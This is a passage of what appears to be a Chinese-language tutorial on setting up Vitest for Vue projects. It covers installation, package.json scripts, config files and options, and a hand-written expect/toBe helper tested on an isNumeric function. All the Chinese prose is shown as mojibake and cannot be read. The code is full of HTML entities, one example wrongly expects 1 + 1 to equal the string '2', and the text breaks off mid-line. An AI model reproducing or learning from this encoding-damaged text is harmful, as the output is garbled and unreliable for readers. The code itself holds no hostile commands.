ä¸­é–“å¯èƒ½é‚„æœƒæœ‰ TypeScript, ESLintâ‹¯â‹¯ç­‰ç­‰å•é¡Œï¼Œè«‹è¦–å°ˆæ¡ˆéœ€è¦åŠ å…¥ Add Vitest for Unit Testing(y/n) â‡’ é¸æ“‡ Yes å¾ŒæŒ‰ä¸‹ Enter (æœ€é‡è¦çš„éƒ¨åˆ† å›ç­”å®Œä¸Šé¢çš„å•é¡Œå¾Œï¼Œå»ºæ§‹å·¥å…·å°±æœƒä¾æ“šå‰›æ‰ç­”è¦†çš„å…§å®¹ï¼Œè‡ªå‹•ç”Ÿæˆéœ€è¦çš„éƒ¨åˆ†ã€‚\næ¯”æ–¹åœ¨ Add Vitest for Unit Testing å•é¡Œå›ç­” Yes çš„è©±ï¼Œé€™æ™‚å»ºæ§‹å·¥å…·å°±æœƒåœ¨å°ˆæ¡ˆä¸­ç”Ÿæˆå–®å…ƒæ¸¬è©¦æ‰€éœ€è¦çš„ç›¸é—œå…§å®¹å¦‚ä¸‹ï¼š\nä¸€å€‹ä½æ–¼ ~å°ˆæ¡ˆæ ¹ç›®éŒ„/src/components/__test__/HelloWorld.spec.js çš„æ¸¬è©¦ç¯„ä¾‹ 1 2 3 4 5 6 7 8 9 10 11 import { describe, it, expect } from \u0026#39;vitest\u0026#39; import { mount } from \u0026#39;@vue/test-utils\u0026#39; import HelloWorld from \u0026#39;../HelloWorld.vue\u0026#39; describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;renders properly\u0026#39;, () =\u0026gt; { const wrapper = mount(HelloWorld, { props: { msg: \u0026#39;Hello Vitest\u0026#39; } }) expect(wrapper.text()).toContain(\u0026#39;Hello Vitest\u0026#39;) }) }) åœ¨ ~å°ˆæ¡ˆæ ¹ç›®éŒ„/package.json è‡ªå‹•æ–°å¢ä¸€å€‹å•Ÿå‹•å–®å…ƒæ¸¬è©¦çš„ scripts æŒ‡ä»¤ 1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:unit\u0026#34;: \u0026#34;vitest --environment jsdom\u0026#34; }, } åœ¨ ~å°ˆæ¡ˆæ ¹ç›®éŒ„/package.json è‡ªå‹•æ–°å¢å–®å…ƒæ¸¬è©¦æ‰€éœ€è¦çš„å·¥å…·å€‘ 1 2 3 4 5 6 7 { \u0026#34;devDependencies\u0026#34;: { \u0026#34;@vue/test-utils\u0026#34;: \u0026#34;^2.0.2\u0026#34;, \u0026#34;jsdom\u0026#34;: \u0026#34;^20.0.0\u0026#34;, \u0026#34;vitest\u0026#34;: \u0026#34;^0.23.0\u0026#34; } } æ¥è‘—å¦‚å‰›å‰›çµ‚ç«¯æ©Ÿå¾Œæ–¹çš„æç¤ºï¼š\nåŸ·è¡Œ cd {å‰›æ‰å°ˆæ¡ˆåç¨±} åˆ‡æ›åˆ°å°ˆæ¡ˆç›®éŒ„åº•ä¸‹ åŸ·è¡Œ npm install å®‰è£å°ˆæ¡ˆæ‰€éœ€è¦çš„å…§å®¹ å®‰è£å®Œç•¢å¾Œï¼Œæ¥è‘—å°±å¯ä»¥åŸ·è¡Œ npm run dev ç¢ºèªç’°å¢ƒï¼Œå¾ŒçºŒè¦åŸ·è¡Œæ¸¬è©¦çš„è©±ï¼ŒåŸ·è¡Œ npm run test:unit å°±èƒ½ç«‹å³é‹ä½œäº†ã€‚\nåœ¨æ—¢æœ‰å°ˆæ¡ˆä¸­åŠ å…¥ Vitest åœ¨æ—¢æœ‰å°ˆæ¡ˆä¸­åŠ å…¥ Vitest ä¾†ä½œç‚ºåŸ·è¡Œæ¸¬è©¦çš„ç’°å¢ƒæ™‚ï¼Œéœ€ç¢ºèªå°ˆæ¡ˆæœ¬èº«æ˜¯ç”± Vite(2.7.10 ç‰ˆæœ¬ä»¥ä¸Š)æ‰€å»ºæ§‹çš„ä¹‹å¤–ï¼Œå…¶ Node.js ç‰ˆæœ¬ä¹Ÿå¿…é ˆç‚º 14 ä»¥ä¸Šï¼Œå¦å‰‡æœƒç„¡æ³•é †åˆ©åŸ·è¡Œæ¸¬è©¦ï¼\nç¢ºèªå¥½å¿…è¦æ¢ä»¶å¾Œå°±å¯ä»¥é–‹å§‹å®‰è£æ¸¬è©¦å·¥å…·ï¼š\nvitestï¼šå–®å…ƒæ¸¬è©¦æ¡†æ¶(æä¾›äº†åŸ·è¡Œæ¸¬è©¦çš„ç’°å¢ƒã€æ–·è¨€ã€éš”é›¢åº«â‹¯â‹¯ç­‰ç­‰åŠŸèƒ½èˆ‡ API) @vue/test-utilsï¼šæ¸¬è©¦ Vue å…ƒä»¶çš„å·¥å…· jsdomï¼šè®“æˆ‘å€‘å¯ä»¥åœ¨ Node ç’°å¢ƒæ¨¡æ“¬å‡ºç€è¦½å™¨ä¸­çš„ DOM ç’°å¢ƒ(æ–¹ä¾¿æ¸¬è©¦) åœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„ä¸‹åŸ·è¡Œï¼š 1 npm install -D vitest @vue/test-utils jsdom æ–°å¢ npm åŸ·è¡Œå–®å…ƒæ¸¬è©¦çš„æŒ‡ä»¤ï¼š package.json 1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:unit\u0026#34;: \u0026#34;vitest --environment jsdom\u0026#34; }, } é€™æ™‚è‹¥å¿ƒæ€¥çš„åŸ·è¡Œ npm run test:unit æœƒç™¼ç¾çµ‚ç«¯æ©Ÿå‘Šè¨´ä½  No test files found, exiting with code 1ï¼ŒåŸå› æ˜¯ä½ å°šæœªåŠ å…¥ä»»ä½•ä¸€å€‹æ¸¬è©¦æ¡ˆä¾‹ã€‚\nè€Œä¸€é–‹å§‹ Vitest é è¨­æ¸¬è©¦çš„æ¯”å°è¦å‰‡æ˜¯ */*.{test,spec}.{js,mjs,cjs,ts,mts,cts,jsx,tsx}ï¼Œç°¡å–®ä¾†èªªä½ åœ¨å°ˆæ¡ˆåº•ä¸‹ä½¿ç”¨ A.test.js æˆ–æ˜¯ B.spec.ts çš„æ–¹å¼éƒ½æœƒè¢« Vitest èªç‚ºæ˜¯æ¸¬è©¦ç¨‹å¼æª”ã€‚\né€™æ™‚ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ ~å°ˆæ¡ˆæ ¹ç›®éŒ„/src/components/__test__/ åº•ä¸‹æ–°å»º HelloWorld.spec.jsï¼š\nsrc/components/test/HelloWorld.spec.js 1 2 3 4 5 6 7 import { describe, it, expect } from \u0026#39;vitest\u0026#39; describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;1 + 1 should be 2\u0026#39;, () =\u0026gt; { expect(1 + 1).toBe(2) }) }) å†æ¬¡åŸ·è¡Œ npm run test:unit çµ‚ç«¯æ©Ÿå°±æœƒé¡¯ç¤ºï¼š\nåˆ°é€™è£¡å°±ç®—æ˜¯æˆåŠŸå®‰è£å¥½å›‰ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘æœƒå†æŠŠ Vitest Config åˆæœŸéœ€è¦è¨­å®šçš„éƒ¨åˆ†èª¿æ•´å¥½å¾Œï¼Œå»ºç½®çš„éƒ¨åˆ†å°±å®Œæˆäº†ã€‚\nVitest Config è¨­å®šæ–¹å¼ Vitest æ¸¬è©¦åœ¨åŸ·è¡Œçš„æ™‚å€™é è¨­æœƒåŸºæ–¼åŸå…ˆå°ˆæ¡ˆä¸­çš„ vite.config.js è¨­å®šæª”ï¼Œæ‰€ä»¥æ²’æœ‰éœ€è¦èª¿æ•´çš„è©±ä¸å¤ªéœ€è¦å¦å¤–è¨­ç½®ï¼Œéœ€è¦èª¿æ•´çš„è©± Vitest ä¹Ÿæä¾›äº†ä¸‰ç¨®æ–¹æ³•è®“ä½ åœ¨ä¸åŒé–‹ç™¼æƒ…å¢ƒä¸‹é¸æ“‡èª¿æ•´æ–¹å¼ï¼š\nåŸ·è¡Œ npm æŒ‡ä»¤æ™‚å¸¶åƒæ•¸æŒ‡å®šè¨­å®šæª”æ¡ˆè·¯å¾‘ ç›´æ¥åœ¨åŸå…ˆ vite.config.js ä¸­èª¿æ•´ é€é vitest.config.js æª”æ¡ˆèª¿æ•´æ¸¬è©¦è¨­å®š åŸ·è¡Œ npm æŒ‡ä»¤æ™‚å¸¶åƒæ•¸æŒ‡å®šè¨­å®šæª”æ¡ˆè·¯å¾‘ è‹¥æƒ³è¦åœ¨åŸ·è¡Œçš„æ™‚å€™å»å¼•å…¥ä¸åŒçš„è¨­å®šæª”æ¡ˆï¼Œå‰‡å¯ä»¥åœ¨ package.json æŒ‡ä»¤ä¸­é€é --config åŠ ä¸Šè¨­å®šæª”æ¡ˆçš„è·¯å¾‘(e.g. vitest --config ./src/scripts/vitest.config.js )ï¼š\npackage.json 1 2 3 4 5 6 7 { //... \u0026#34;scripts\u0026#34;: { \u0026#34;test:unit\u0026#34;: \u0026#34;vitest --config ./src/__test__/config/vitest.config.js\u0026#34;, } //... } æ¥è‘—è©²æª”æ¡ˆå°±å¦‚è¨­å®š vitest.config.js ä¸€æ¨£èª¿æ•´å°±å¯ä»¥äº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import { defineConfig } from \u0026#39;vite\u0026#39; import vue from \u0026#39;@vitejs/plugin-vue\u0026#39; // https://vitejs.dev/config/ export default defineConfig({ plugins: [ vue(), ], test: { // åœ¨é€™é‚ŠåŠ å…¥è¨­å®š }, }) åœ¨å°ˆæ¡ˆä¸­çš„ vite.config.js ä¸­èª¿æ•´æ¸¬è©¦è¨­å®š è‹¥æƒ³åœ¨åŸå…ˆçš„ vite.config.js ä¸­èª¿æ•´æ¸¬è©¦è¨­å®šï¼Œæœ‰å…©ç¨®æ–¹å¼å¯ä»¥ä½¿ç”¨ï¼š\nç¬¬ä¸€ç¨®æ˜¯ç›´æ¥åœ¨æœ€ä¸Šæ–¹åŠ å…¥ /// \u0026lt;reference types=\u0026quot;vitest\u0026quot; /\u0026gt; å¾Œï¼Œåœ¨ test å±¬æ€§ä¸­åŠ å…¥è¨­å®šï¼š vite.config.js 1 2 3 4 5 6 7 8 /// \u0026lt;reference types=\u0026#34;vitest\u0026#34; /\u0026gt; import { defineConfig } from \u0026#39;vite\u0026#39; export default defineConfig({ test: { // åœ¨é€™é‚ŠåŠ å…¥è¨­å®š }, }) ç¬¬äºŒç¨®ï¼ŒæŠŠåŸå…ˆçš„ defineConfig æ”¹ç”± vitest/config å‚³å…¥å¾Œï¼Œåœ¨ test å±¬æ€§ä¸­åŠ å…¥è¨­å®šï¼š vite.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { // åœ¨é€™é‚ŠåŠ å…¥è¨­å®š }, }) é€é vitest.config.js æª”æ¡ˆèª¿æ•´æ¸¬è©¦è¨­å®š è‹¥æƒ³å€éš”é–‹ç™¼èˆ‡æ¸¬è©¦ç”¨çš„è¨­å®šæ™‚ï¼Œå¯ä»¥åœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„ä¸­æ–°å¢ vitest.config.js æª”æ¡ˆï¼Œé€™æœƒæ¯”åŸå…ˆåƒè€ƒçš„ vite.config.js æ“æœ‰æ›´é«˜çš„å„ªå…ˆæ¬Šã€‚\nä¸æƒ³å°‡åŸå…ˆåœ¨ vite.config.js è¨­å®šéƒ½é‡æ–°å…¨å¯«ä¸€æ¬¡çš„è©±ï¼Œä¹Ÿå¯ä»¥åœ¨ vitest.config.js ä¸­ï¼Œä½¿ç”¨ mergeConfig ä¾†èåˆ vite.config.js çš„è¨­å®šï¼š\n1 2 3 4 5 6 7 8 9 import { mergeConfig } from \u0026#39;vite\u0026#39; import { defineConfig } from \u0026#39;vitest/config\u0026#39; import viteConfig from \u0026#39;./vite.config\u0026#39; // åŸå…ˆçš„ vite è¨­å®šæª”æ¡ˆ export default mergeConfig(viteConfig, defineConfig({ test: { // åœ¨é€™è£¡åŠ å…¥æ¸¬è©¦è¨­å®š }, })) Vitest config option è‡³æ–¼ Vitest config èƒ½èª¿æ•´ä»€éº¼å…§å®¹å‘¢ï¼Œé€™è£¡åˆ—äº†å¹¾å€‹å¸¸è¦‹çš„èª¿æ•´é¸é …ï¼š\ninclude exclude globals environment è¨»ï¼šä»¥ä¸‹éƒ¨åˆ†è³‡æ–™å¼•ç”¨ Vitest Config Option ä¸¦ç¿»è­¯èˆ‡è£œå……ã€‚\ninclude Typeï¼š string[] é è¨­å€¼ï¼š [\u0026rsquo;**/*.{test,spec}.{js,mjs,cjs,ts,mts,cts,jsx,tsx}'] è—‰ç”±é€™å€‹æ¬„ä½æˆ‘å€‘å¯ä»¥æä¾› glob æ ¼å¼è®“ vitest å»æ¯”å°å“ªäº›æ˜¯æ¸¬è©¦æª”æ¡ˆï¼Œä¹Ÿå¯ä»¥æ”¾å…¥å¤šå€‹æ¢ä»¶åœ¨é™£åˆ—ä¸­ã€‚\nvitest.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { include: [\u0026#39;**/*.spec.js\u0026#39;], }, }) é€™å€‹è¨­å®šä¸»è¦æœƒå½±éŸ¿åˆ°å¾ŒçºŒæˆ‘å€‘è¦å¦‚ä½•æ“ºæ”¾æ¸¬è©¦ç¨‹å¼ç¢¼ï¼Œå› æ­¤åšè¦åŠƒæ™‚å¯ä»¥æŒ‰éœ€æ±‚è€ƒé‡èª¿æ•´ã€‚\nexclude Typeï¼š string[] é è¨­å€¼ï¼š [\u0026rsquo;/node_modules/\u0026rsquo;, \u0026lsquo;/dist/\u0026rsquo;, \u0026lsquo;/cypress/\u0026rsquo;, \u0026lsquo;/.{idea,git,cache,output,temp}/\u0026rsquo;] è—‰ç”±é€™å€‹æ¬„ä½æˆ‘å€‘å¯ä»¥æä¾› glob æ ¼å¼è®“ vitest å»æ’é™¤å“ªäº›ä¸æ˜¯æ¸¬è©¦æª”æ¡ˆï¼Œä¹Ÿå¯ä»¥æ”¾å…¥å¤šå€‹æ¢ä»¶åœ¨é™£åˆ—ä¸­ã€‚\nvitest.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { exclude: [\u0026#39;**/node_modules/**\u0026#39;, \u0026#39;**/dist/**\u0026#39;, \u0026#39;**/cypress/**\u0026#39;, \u0026#39;**/.{idea,git,cache,output,temp}/**\u0026#39;], }, }) èˆ‡ include ç›¸åï¼Œé€™æ¬¡å‰‡æ˜¯è¦æ’é™¤å“ªäº›è·¯å¾‘ä¸éœ€è¦å°‹æ‰¾æ˜¯å¦æœ‰æ¸¬è©¦æª”æ¡ˆï¼Œå…¶ä¸­å¦‚æœæœ‰ç”¨åˆ° cypress åš E2E æ¸¬è©¦çš„è©±ï¼Œé è¨­è¦å‰‡ä¸­å°±å·²ç¶“æœ‰å¦å¤–æ’é™¤äº†ï¼Œæ‰€ä»¥æ²’å¿…è¦çš„è©±ä¸å¿…ç‰¹åˆ¥è¨­ç½®ï¼Œä½†å¯ä»¥å…ˆè¨˜å¾—æœ‰é€™å€‹æ–¹ä¾¿çš„æ¬„ä½ã€‚\nGlobals Typeï¼š boolean é è¨­å€¼ï¼š false ç”±æ–¼åœ¨æ’°å¯«æ¸¬è©¦æ™‚ï¼ŒVitest é è¨­æ˜¯éœ€è¦è‡ªå·±æŒ‰éœ€è¦å¼•å…¥å°æ‡‰çš„æ–¹æ³•ç­‰ç­‰ï¼Œå¦‚æœè¦é¡ä¼¼åƒ Jest ä»¥å…¨åŸŸçš„æ–¹å¼æ³¨å…¥åˆ°æ¸¬è©¦ä¸­ï¼Œå°±å¯ä»¥é€éåœ¨åŸ·è¡Œæ™‚åŠ ä¸Š --globals é¸é …ï¼Œæˆ–æ˜¯åœ¨ vitest config é¸é …ä¸­åŠ å…¥ globals: trueã€‚\nvitest.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { globals: true, }, }) åŸå…ˆè¨­å®šå‰ï¼Œæ¸¬è©¦ç¨‹å¼ç¢¼éœ€è¦å¦‚ä¸‹æ–¹å¼•å…¥ï¼š\n1 2 3 4 5 6 7 import { describe, it, expect } from \u0026#39;vitest\u0026#39; describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;1 + 1 should be 2\u0026#39;, () =\u0026gt; { expect(1 + 1).toBe(\u0026#39;2\u0026#39;) }) }) åŠ å…¥ Globals: true å¾Œï¼Œå°±ä¸éœ€è¦é¡¯ç¤ºå¼•å…¥ vitest æ¸¬è©¦ç›¸é—œçš„ APIï¼Œè®“æ¸¬è©¦çœ‹èµ·ä¾†æ›´ä¹¾æ·¨ï¼š\n1 2 3 4 5 describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;1 + 1 should be 2\u0026#39;, () =\u0026gt; { expect(1 + 1).toBe(\u0026#39;2\u0026#39;) }) }) environment Typeï¼š \u0026rsquo;node\u0026rsquo; | \u0026lsquo;jsdom\u0026rsquo; | \u0026lsquo;happy-dom\u0026rsquo; | \u0026rsquo;edge-runtime\u0026rsquo; | string é è¨­å€¼ï¼š \u0026rsquo;node\u0026rsquo; ç”±æ–¼ Vitest æœ¬èº«é»˜èªç’°å¢ƒ Node.jsï¼Œå› æ­¤è‹¥è¦åœ¨æ¸¬è©¦ä¸­ä»¿é€ ç€è¦½å™¨çš„æ‡‰ç”¨ç¨‹å¼ï¼Œå¯ä»¥é€éé¡ä¼¼ jsdom ç­‰å·¥å…·ä¾†å–ä»£ï¼Œè€Œå·²ç¶“ä»‹ç´¹éçš„ npm æŒ‡ä»¤çš„å¯«æ³•ä¹‹å¤– -environment jsdom ï¼Œé‚„å¯ä»¥åœ¨æ¸¬è©¦æª”æ¡ˆä¸Šä»¥ docblock æˆ– comment é¢¨æ ¼çš„æ–¹å¼è¨»è¨˜ã€‚\nDocblock é¢¨æ ¼ï¼š\n1 2 3 4 5 6 7 8 9 /** * @vitest-environment jsdom **/ it(\u0026#39;use jsdom in this test file\u0026#39;, () =\u0026gt; { const element = document.createElement(\u0026#39;div\u0026#39;) element.innerHTML = \u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39; expect(element.innerHTML).toBe(\u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39;) }) Comment é¢¨æ ¼ï¼š\n1 2 3 4 5 6 7 // @vitest-environment jsdom it(\u0026#39;use jsdom in this test file\u0026#39;, () =\u0026gt; { const element = document.createElement(\u0026#39;div\u0026#39;) element.innerHTML = \u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39; expect(element.innerHTML).toBe(\u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39;) }) å¯«åœ¨ vitest config ä¸­ï¼š\n1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { environment: \u0026#39;jsdom\u0026#39;, }, }) å¦‚æ­¤ä¸€ä¾†åœ¨æ¸¬è©¦ä¸­æˆ‘å€‘å°±å¯ä»¥æ¨¡æ“¬ Web ç«¯ç’°å¢ƒä¾†æ“ä½œäº†ã€‚\nä»¥ä¸Šæ˜¯ Vitest å¹¾å€‹æ¯”è¼ƒå¸¸è¦‹çš„è¨­å®šï¼Œå…¶é¤˜çš„è¨­å®šå¾ŒçºŒä¹ŸæœƒæŒ‰éœ€æ±‚é™¸çºŒæåˆ°ï¼Œè‹¥å°æ–¼å…¶ä»–è¨­å®šé¸é …æœ‰èˆˆè¶£çš„ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ°å®˜æ–¹æ–‡ä»¶ä¸­çš„ config åˆ†é  æŸ¥çœ‹ã€‚\næ¸¬è©¦çš„æœ¬è³ª æ¸¬è©¦çš„æœ¬è³ªç©¶ç«Ÿæ˜¯ä»€éº¼ï¼Ÿæ¸¬è©¦ç°¡å–®çš„ä¾†èªªä¸»è¦å°±æ˜¯è—‰ç”±æ“æ§å—æ¸¬ç‰©(SUT, System Under Test)ï¼Œè§€å¯Ÿç”±å—æ¸¬ç‰©ç”¢ç”Ÿçš„æœ€çµ‚ç‹€æ…‹æ˜¯å¦å¦‚æˆ‘å€‘æ‰€é æœŸçš„æ¨£å­ï¼š\nè‹¥æœ€çµ‚ç‹€æ…‹ç¬¦åˆæˆ‘å€‘çš„é æœŸï¼Œå°æ–¼é–‹ç™¼è€…çš„å«ç¾©ä¾†èªªï¼Œå°±æ˜¯å—æ¸¬ç‰©ç¬¦åˆäº†æˆ‘å€‘çš„æœŸå¾…ã€‚\nä½†é€™é»å¥½è™•çœ‹ä¼¼æ²’æœ‰åšã€Œæ¸¬è©¦ã€çš„å¿…è¦ï¼Œç•¢ç«Ÿæˆ‘å€‘å¹³æ™‚é–‹ç™¼èƒ½é©—æ”¶å®Œæˆä¸å°±æ˜¯ç¬¦åˆäº†è¦æ ¼æ›¸çš„æœŸå¾…å—ï¼Ÿ\nå› æ­¤ç‚ºäº†èƒ½å¤ æ›´åŠ é«”æœƒæ¸¬è©¦èƒŒå¾Œçš„åƒ¹å€¼ï¼Œæˆ‘å€‘æ¥ä¸‹ä¾†å°‡å¯¦éš›åšä¸€å€‹æ¸¬è©¦å·¥å…·ä¾†ä¾†æª¢é©—æˆ‘å€‘è‡ªå·±æ‰€å¯«çš„å‡½å¼ã€‚\næƒ…å¢ƒèˆ‰ä¾‹ é¦–å…ˆï¼Œæƒ…å¢ƒå‡è¨­åœ¨å°ˆæ¡ˆä¸­æœ‰ä¸€è™•é‚è¼¯åˆ¤æ–·éœ€è¦æª¢æ¸¬å‚³é€²ä¾†è³‡æ–™çš„æ˜¯å¦ç‚ºæ•¸å€¼(Numeric)ï¼Œè€Œå‚³é€²ä¾†çš„è³‡æ–™å¯èƒ½æœ‰ 1, null, '100', NaN ç­‰ã€‚\næˆ‘å€‘å¸Œæœ›ç•¶ 1 å’Œ '100' æ™‚ï¼Œè©²åˆ¤æ–·æ‡‰è©²è¦ç‚º trueï¼Œè€Œ null èˆ‡ NaN å‰‡æ˜¯è¦ç‚º falseã€‚\næ¥ä¸‹ä¾†çš„ç›®æ¨™æˆ‘å€‘è¦åšçš„å°±æ˜¯ï¼š\nè£½ä½œä¸€å€‹ç°¡æ˜“çš„æ¸¬è©¦å·¥å…· å¯«æ¸¬è©¦æ¡ˆä¾‹ å¯«å—æ¸¬ç¨‹å¼ç¢¼çš„å¯¦ä½œ ç°¡æ˜“çš„æ¸¬è©¦å·¥å…· é¦–å…ˆè¦åŠƒä¸€ä¸‹å·¥å…·æˆ‘æœ€å¾Œå¸Œæœ›ç”¨èµ·ä¾†åƒæ˜¯é€™å€‹æ¨£å­ï¼š\nexpect(å—æ¸¬ç‰©).toBe(é æœŸç‹€æ…‹)\nå›å‚³ true è¡¨ç¤ºæ¸¬è©¦æˆåŠŸ (å³ç‚ºæœ€çµ‚ç‹€æ…‹èˆ‡é æœŸç‹€æ…‹ç›¸åŒ) å›å‚³ false è¡¨ç¤ºæ¸¬è©¦å¤±æ•— (å³ç‚ºæœ€çµ‚ç‹€æ…‹èˆ‡é æœŸç‹€æ…‹ä¸åŒ)ï¼Œç„¶å¾ŒåŠ ä¸Š error æç¤ºé æœŸç‹€æ…‹æ‡‰è©²è¦æ˜¯ä»€éº¼ï¼Œæœ€çµ‚ç‹€æ…‹ç›®å‰æ˜¯ä»€éº¼ã€‚ æ¥è‘—æŒ‰ç…§ä¸Šé¢çš„è¨­æƒ³ï¼Œå…ˆå®šç¾©äº†ä¸€å€‹å®£å‘Šå‡½å¼ expectï¼Œåƒæ•¸å‰‡æ˜¯é è¨ˆè¼¸å…¥å—æ¸¬ç‰©(input)èˆ‡ï¼š\n1 2 3 const expect = (input) =\u0026gt; { // ... } å†ä¾†å·¥å…·æœ¬èº«å‘¼å«æ™‚éœ€å›å‚³äº†ä¸€å€‹å«åš toBe çš„é©—è­‰æ–¹æ³•ï¼Œè©²é©—è­‰æ–¹æ³•çš„åƒæ•¸ç‚ºé æœŸç›®æ¨™(expected)ï¼š\n1 2 3 4 5 6 const expect = (input) =\u0026gt; { const toBe = (expected) =\u0026gt; {} return { toBe } } æ¥è‘—è¨­è¨ˆè©²é©—è­‰çš„æ–¹æ³•ï¼Œä½¿å…¶èƒ½å¤ å›æ‡‰æ¸¬è©¦çš„çµæœï¼š\n1 2 3 4 5 6 const expect = (input) =\u0026gt; { const toBe = (expected) =\u0026gt; input === expected return { toBe } } ç¾åœ¨æˆ‘å€‘é€éç¶²é ç€è¦½å™¨çš„ devtool console æ§åˆ¶å°ï¼Œå°±å¯ä»¥é€éè©²æ¸¬è©¦å·¥å…·åšç°¡æ˜“çš„æ¸¬è©¦æ¡ˆä¾‹äº†ï¼š\n1 2 3 4 5 6 7 8 const expect = (input) =\u0026gt; { const toBe = (expected) =\u0026gt; input === expected return { toBe } } expect(1 === 1).toBe(true) expect(2 !== 1).toBe(true) ä½†æˆ‘å€‘å¸Œæœ›ä»–èƒ½å¤ åœ¨æ¸¬è©¦æ¡ˆä¾‹å¤±æ•—çš„æ™‚å€™å›æ‡‰ä¸€ä¸‹ç•¶ä¸‹é æœŸèˆ‡çµæœçš„ç‹€æ³ï¼Œå¾ŒçºŒæˆ‘å€‘æ‰èƒ½é‡å°ç´€éŒ„çš„çµæœåšä¿®æ­£ã€‚å› æ­¤æˆ‘å€‘å†ä¿®æ”¹ä¸€ä¸‹æ¸¬è©¦æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 const expect = (input) =\u0026gt; { const handleOnError = (result, expected) =\u0026gt; { console.error(`æ¸¬è©¦å¤±æ•—ï¼šé æœŸæ‡‰è©²ç‚º ${expected}ï¼Œçµæœç¾åœ¨ç‚º ${result}`) return false } const toBe = (expected) =\u0026gt; input === expected ? true : handleOnError(input, expected) return { toBe } } å†åŸ·è¡Œä¸€å€‹æ•…æ„å¯«éŒ¯çš„æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 expect(2 === 1).toBe(true) ç¾åœ¨å¯ä»¥çœ‹åˆ°ç•¶æ¸¬è©¦æ¡ˆä¾‹ç™¼ç”ŸéŒ¯èª¤çš„æ™‚å€™ï¼Œé™¤äº†æœƒå›å‚³æ¸¬è©¦çµæœä¹‹å¤–ï¼Œé‚„æœƒå¤šå€‹éŒ¯èª¤æé†’ç›®å‰éŒ¯èª¤çš„åŸå› äº†ï¼\nå¯«æ¸¬è©¦æ¡ˆä¾‹ åœ¨å®Œæˆæ¸¬è©¦å·¥å…·å¾Œï¼Œç¾åœ¨æˆ‘å€‘è¦ä¾†å¯«æ¸¬è©¦æ¡ˆä¾‹ï¼Œé¦–å…ˆæˆ‘å€‘å…ˆå¯«ä¸€å€‹é‚„æ²’æœ‰å¯«å¯¦ä½œéƒ¨åˆ†çš„åˆ¤æ–·å‡½å¼(isNumeric)ï¼š\n1 const isNumeric = (val) =\u0026gt; {} æ¥è‘—æŒ‰ç…§é¡Œç›®æ‰€è¨­å®šçš„æ¢ä»¶ï¼Œä¾†æ’°å¯«æ¸¬è©¦æ¡ˆä¾‹ï¼š\né¡Œç›®è¨­å®šï¼š\nç•¶ 1 å’Œ '100' æ™‚ï¼Œè©²åˆ¤æ–·æ‡‰è©²è¦ç‚º trueï¼Œ\nè€Œ null èˆ‡ NaN å‰‡æ˜¯è¦ç‚º falseã€‚\n1 2 3 4 5 6 const isNumeric = (val) =\u0026gt; {} expect(isNumeric(1)).toBe(true) expect(isNumeric(\u0026#39;100\u0026#39;)).toBe(true) expect(isNumeric(null)).toBe(false) expect(isNumeric(NaN)).toBe(false) æ­¤æ™‚åŸ·è¡Œå¾Œæœƒç™¼ç¾æœƒç™¼ç¾å››å€‹æ¡ˆä¾‹éƒ½å ±éŒ¯ï¼Œå› ç‚ºç›®å‰æˆ‘å€‘é‚„æ²’æ’°å¯« isNumeric çš„åˆ¤æ–·å¯¦ä½œï¼Œä½†åˆ°é€™ä¸€æ­¥æ¸¬è©¦æ¡ˆä¾‹å°±å·²ç¶“ç®—æ˜¯å¯«å¥½äº†ï¼Œå› ç‚ºæˆ‘å€‘çš„ç›®çš„æ˜¯è¦å¯«å°çš„æ¸¬è©¦æ¡ˆä¾‹ï¼Œè®“å¯¦ä½œå»ç¬¦åˆã€‚\nå¯«å—æ¸¬ç¨‹å¼ç¢¼çš„å¯¦ä½œ å®Œæˆæ¸¬è©¦æ¡ˆä¾‹å¾Œï¼Œæˆ‘å€‘å°‡è¦ä¾†å¯«æ¸¬è©¦ç¨‹å¼ç¢¼çš„å¯¦ä½œéƒ¨åˆ†ï¼š\n1 const isNumeric = (value) =\u0026gt; !isNaN(value - parseFloat(value)) æœ€å¾Œï¼Œå°‡æ•´å€‹æ¸¬è©¦èˆ‡å¯¦ä½œåˆä½µèµ·ä¾†å°±æœƒåƒé€™æ¨£å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // æ¸¬è©¦å·¥å…·ç¨‹å¼ç¢¼éƒ¨åˆ† const expect = (input) =\u0026gt; { const handleOnError = (result, expected) =\u0026gt; { console.error(`æ¸¬è©¦å¤±æ•—ï¼šé æœŸæ‡‰è©²ç‚º ${expected}ï¼Œçµæœç¾åœ¨ç‚º ${result}`) return false } const toBe = (expected) =\u0026gt; input === expected ? true : handleOnError(input, expected) return { toBe } } // å¯¦ä½œç¨‹å¼ç¢¼éƒ¨åˆ† const isNumeric = (value) =\u0026gt; !isNaN(value - parseFloat(value)) // æ¸¬è©¦æ¡ˆä¾‹éƒ¨åˆ† expect(isNumeric(1)).toBe(true) // 